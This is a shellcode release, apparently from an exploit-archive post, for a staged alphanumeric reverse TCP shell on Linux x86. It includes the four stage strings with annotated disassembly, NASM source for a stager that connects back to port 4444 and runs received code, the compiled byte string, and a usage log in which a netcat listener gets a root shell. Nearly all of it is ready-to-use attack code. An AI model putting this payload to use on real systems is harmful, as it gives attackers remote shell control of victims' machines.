########### Reverse TCP Staged Alphanumeric Shellcode Linux x86 Execve /bin/sh ########
			########### Author: Snir Levi, Applitects #############
					## 103 Bytes ##

date: 9.2.17
Automatic python shellcode handler (with stage preset send) will be ready soon:
https://github.com/snir-levi/Reverse_TCP_Alphanumeric_Staged_Shellcode_Execve-bin-bash/


IP - 	127.0.0.1
PORT - 	4444

#### Stage Alphanumeric shellcode: #####
Stage 1:
dup2 stdin syscall:

WXW[j?XV[WYPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXP

W	push edi
X	pop eax
W	push edi
[	pop ebx
j?	push 0x3f
X	pop eax
V	push esi
[	pop ebx
W	push edi
Y	pop ecx
P	push eax
X	pop eax
P	push eax
X	pop EAX

Stage 2:
dup2 stdout syscall:

WXW[j?XV[WYAPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPX

W	push edi
X	pop eax
W	push edi
[	pop ebx
j?      push 0x3f
X       pop eax
V       push esi
[       pop ebx
W       push edi
Y       pop ecx
A	inc ecx (ecx =1)
P       push eax
X       pop eax
P       push eax

Stage 3:
dup2 stderr syscall:

WXW[j?XV[WYAPXAPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXP

W	push edi
X	pop eax
W	push edi
[	pop ebx
j?      push 0x3f
X       pop eax
V       push esi
[       pop ebx
W       push edi
Y       pop ecx
A*2     inc ecx (ecx = 2)
P       push eax
X       pop eax
A       inc ecx

Stage 3:
execve /bin/sh:

j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHWYWZWh//shh/binT[

j0		push 0x30
X		pop eax
H*32		dec eax //eax = 0x0b
W		push edi
Y		pop ecx
W		push edi
Z		pop edx
W		push edi // null terminator
h//sh		push 0x68732f2f //sh
h/bin		push 0x6e69622f /bin
T		push esp
[		pop ebx

Usage: Victim Executes the shellcode, and opens tcp connection

Stage:
		After Connection is established, send the 4 stages ***separately***

		nc -lvp 4444
		connect to [127.0.0.1] from localhost [127.0.0.1] (port)
		WXW[j?XV[WYPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXP
		WXW[j?XV[WYAPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPX
		WXW[j?XV[WYAPXAPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXPXP
		j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHWYWZWh//shh/binT[

		whoami
		root
		id
		uid=0(root) gid=0(root) groups=0(root)


global _start


_start:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 102 - socketcall
	; socket = 0x01

	xor eax,eax
	xor esi,esi
	push eax
	pop edi
	push eax
	mov al, 0x66
	push byte 0x1
	pop ebx
	push byte ebx
	push byte 0x2
	mov ecx, esp
	int 0x80

	xchg esi, eax;  save sock result

	; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1")

	push byte 0x1
	pop edx
	shl edx, 24
	mov dl, 0x7f	;edx = 127.0.0.1 (hex)
	push edx
	push word 0x5c11 ;port 4444
	push word 0x02

        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	mov al, 0x66
	mov bl, 0x3
	mov ecx, esp
	push byte 0x10
	push ecx
	push esi
	mov ecx ,esp
	int 0x80


stageAddress:		;saves stage address to edx
        mov edx, [esp]
	sub bl,3
	jnz stage

call near stageAddress

	;recv(int sockfd, void *buf, size_t len, int flags);

stage:
	mov al, 0x66
	mov bl, 10
	push edi
	push word 100   ; buffer size
	push edi
	push esi	; socketfd
	mov [esp+4],esp ; sets esp as recv buffer
	mov ecx,esp
	int 0x80
        mov al, 0xcd
        mov ah, 0x80 ; eax = int 0x80
        mov bl, 0xFF
        mov bh, 0xE2 ; ebx = jmp edx
        mov [esp+57],al
        mov [esp+58],ah
        mov [esp+59], ebx ;the end of the buffer contains the syscall command int 0x80 and jmp back to stage
	jmp esp



unsigned char[] = "\x31\xc0\x31\xf6\x50\x5f\x50\xb0\x66\x6a\x01\x5b\x53\x6a
\x02\x89\xe1\xcd\x80\x96\x6a\x01\x5a\xc1\xe2\x18\xb2\x7f\x52
\x66\x68\x11\x5c\x66\x6a\x02\xb0\x66\xb3\x03\x89\xe1\x6a\x10\x51\x56\x89\xe1
\xcd\x80\x8b\x14\x24\x80\xeb\x03\x75\x05\xe8\xf3\xff\xff\xff
\xb0\x66\xb3\x0a\x57\x66\x6a\x64\x57\x56\x89\x64\x24\x04\x89\xe1\xcd\x80\xb0
\xcd\xb4\x80\xb3\xff\xb7\xe2\x88\x44\x24\x39\x88\x64\x24\x3a
\x89\x5c\x24\x3b\xff\xe4"